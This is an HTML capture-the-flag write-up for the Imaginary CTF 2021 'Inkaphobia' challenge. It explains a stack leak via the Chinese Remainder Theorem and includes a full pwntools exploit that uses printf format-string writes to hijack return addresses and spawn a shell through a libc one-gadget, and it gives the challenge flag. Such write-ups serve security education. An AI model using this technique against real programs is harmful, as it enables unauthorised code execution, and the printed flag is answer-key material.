@@ -1,0 +1,146 @@
+<!--Solve date: 07/30/2021-->
+
+<h1>Imaginary CTF 2021 - Inkaphobia</h1>
+
+<h2>Binary Exploitation - 300 pts</h2>
+
+<h3>Writeup by YR81</h3>
+
+<h4>Discussion</h4>
+
+<h5>Program Behavior</h5>
+
+<p>This program starts by calling <code>mprotect()</code> on the section of memory beginning at <code>abort()</code>, the first function in libc, to allow reads to and execution of but disables writes to <code>libc</code>. However, as we know, the x64 page granularity is 4 KB, and <code>abort() = libc + 0x2572e</code> for the version provided (<code>libc-2.31.so</code>), so this call will fail and ends up being useless.</p>
+
+<p>Following this, the program gets the current Linux time with a call to <code>time(0)</code> and subsequently uses that time to seed the random number generator. Then, one random number is obtained by a call to <code>rand()</code> and <i>a pointer to it (on the stack)</i> is passed to a function named <code>dorng()</code>. The key is that <code>dorng()</code> uses its first argument's value <i>directly</i> (not as a pointer) to generate six pseudo-random numbers. These pseudo-random numbers are simply the modulos after division of the argument by user-specified integers between 1 and 127 (inclusive).</p>
+
+<img src = "./images/ictf2021_inkaphobia1.png"/>
+
+<p class = "caption">Figure 1. Random number generation in <code>dorng()</code>.</p>
+
+<p>Returning to main, there is a prominent <code>printf()</code> format string vulnerability, where the buffer is located on the stack.</p>
+
+<p>Note that in this challenge, full RELRO is enabled, which means that we cannot overwrite entries in the global offset table.</p>
+
+<h5>Leaking Stack with Chinese Remainder Theorem</h5>
+
+<p>Although the stack address of <code>rand@main()</code> is not directly given to us, <code>dorng()</code> gives us six <i>remainders</i> of the address after dividing by numbers between 1 and 127 (inclusive). In this way, specifying six relatively-coprime integers and solving the congruence equations allows us to obtain a unique solution modulo the product of the numbers via the Chinese Remainder Theorem. To this end, it helps to pick big numbers such that their product is larger than the possible range of the stack; otherwise, the attack would be nondeterministic. Testing the server by using a format <code>%1$p</code>, typical stack addresses satisfy a conservative range of <code>0x7ff800000000 &lt;= x &lt; 0x800000000000</code>, a span of <code>0x800000000</code>, or just under 34.4 billion, bytes. This is a modest product to obtain, since we are allowed divisors up to 127. For example, consider <code>{127, 125, 124, 123, 121, 113}</code>, which is a relatively-prime set of numbers with product <code>3_310_581_961_500</code>: more than 3.3 trillion, which is far more than the possible stack range. In this way, the leak is unique.</p>
+
+<p>The algorithm for solving a system of linear congruences modulo relatively-prime numbers is easy and will not be discussed; a good demonstration can be found <a href = "https://crypto.stanford.edu/pbc/notes/numbertheory/crt.html" target = "_blank">here</a>. We can simply implement the algorithm in Python and solve for the stack address obtained from the leaks by repeatedly adding the product until we get an address in the stack range.</p>
+
+<h5>Format String Exploit</h5>
+
+<p>With the stack leak obtained from above, we can overwrite the return pointer to point back to <code>main()</code>, giving us a second chance at the exploitation. (It turns out that we actually need to insert another empty <code>ret</code> gadget to maintain stack alignment and prevent segfault on the first <code>printf()</code>.) Along the way, we also leak a <code>libc</code> address. The address to leak in <code>libc</code> can just be the return address from <code>__libc_start_main()</code> at offset 75 within the stack.</p>
+
+<p>The second time around, with knowledge of both <code>libc</code> and the stack, we can simply overwrite the return pointer to an appropriate one-gadget and obtain a shell. In the provided <code>libc.so.6</code> (version 2.31), a good gadget to use is at offset <code>0xe6c81</code>, whose preconditions of <code>r15 = NULL</code> and <code>rdx = NULL</code> are both satisfied after the call to <code>printf()</code>.</p>
+
+<h4>Payload</h4>
+
+<pre class = "python">
+from pwn import *
+import functools
+
+ready = True
+debug = False
+
+if ready:
+    p = remote("chal.imaginaryctf.org", 42008)
+    libc = ELF("./libc.so.6")
+    __libc_start_main_ret_offs_libc = 0x270b3
+    one_gadg_offs_libc = 0xe6c81
+else:
+    p = process("./inkaphobia")
+    libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
+    __libc_start_main_ret_offs_libc = 0x21b97
+    one_gadg_offs_libc = 0x4f365
+    if debug:
+        context.terminal = ["/mnt/c/Users/********/wsl-terminal/open-wsl.exe", "-e"]
+        gdb.attach(p, gdbscript = """
+        
+        """)
+
+
+# exploit
+# extended Euclid's algorithm for GCD
+def egcd(a, b):
+    if a == 0:
+        return (b, 0, 1)
+
+    g, y, x = egcd(b % a, a)
+    return (g, x - (b // a) * y, y)
+
+# modular inverse
+def modinv(a, N):
+    g, x, y = egcd(a, N)
+    if g != 1:
+        raise Exception("Modular inverse does not exist!")
+
+    return x % N
+
+
+stack_lo = 0x7ff800000000
+stack_hi = 0x800000000000
+ret = 0x400a83
+main = 0x400977
+
+p.recvline()
+div = [127, 125, 124, 123, 121, 113]
+N = functools.reduce(lambda a, b: a * b, div)
+rem = [0] * 6
+for i in range(6):
+    p.recvuntil(b"Enter max value: ")
+    p.sendline(bytes(str(div[i]), "utf-8"))
+    p.recvuntil(b"Random number: ")
+    rem[i] = int(p.recvline().strip())
+
+# solve congruence system
+z = 0
+for i in range(6):
+    b = N // div[i]
+    z += rem[i] * b * modinv(b, div[i])
+
+# get stack leak
+z %= N
+while z < stack_lo:
+    z += N
+
+assert z < stack_hi, "Solution not found"
+
+log.info("Stack leak: %s" % (hex(z)))
+canary = z + 0x20c
+main_ret = z + 0x21c
+p.recvline()            #name prompt
+
+# first payload: 37 is the length of the prefix
+p.sendline((b"%%75$16p||%%1$%dx%%24$hn%%1$%dx%%25$hn%%1$%dx%%26$hn%%1$%dx%%27$hn%%1$%dx%%28$hn%%1$%dx%%29$hn" % (((ret >> 0) - 18) & 0xffff, 
+    ((ret >> 16) - (ret >> 0)) & 0xffff, 
+    ((ret >> 32) - (ret >> 16)) & 0xffff, 
+    ((main >> 0) - (ret >> 32)) & 0xffff, 
+    ((main >> 16) - (main >> 0)) & 0xffff, 
+    ((main >> 32) - (main >> 16)) & 0xffff)).ljust(0x80, b'\x00') + 
+    p64(main_ret) + p64(main_ret + 2) + p64(main_ret + 4) + 
+    p64(main_ret + 8) + p64(main_ret + 10) + p64(main_ret + 12))
+
+p.recvuntil(b"Thanks for coming, ")
+libc.address = int(p.recvuntil(b"||")[: -2], 16) - __libc_start_main_ret_offs_libc
+log.info("Libc: %s" % (hex(libc.address)))
+one_gadg = libc.address + one_gadg_offs_libc
+p.recvline()
+for _ in range(6):
+    p.recvuntil(b"Enter max value: ")
+    p.sendline(b'1')
+    p.recvline()
+
+p.recvline()            #name prompt
+main_ret += 0x10        #new main() frame is offset by 0x10 relative to old one
+p.sendline((b"%%1$%dx%%24$hn%%1$%dx%%25$hn%%1$%dx%%26$hn" % (((one_gadg >> 0) - (0)) & 0xffff, 
+    ((one_gadg >> 16) - (one_gadg >> 0)) & 0xffff, 
+    ((one_gadg >> 32) - (one_gadg >> 16)) & 0xffff)).ljust(0x80, b'\x00') + 
+    p64(main_ret) + p64(main_ret + 2) + p64(main_ret + 4))
+
+p.interactive()    
+</pre>
+
+<h4>Flag</h4>
+
+<p><code>ictf{th3_3ntr0py_th13f_str1k3s!_38ba8f19}</code></p>
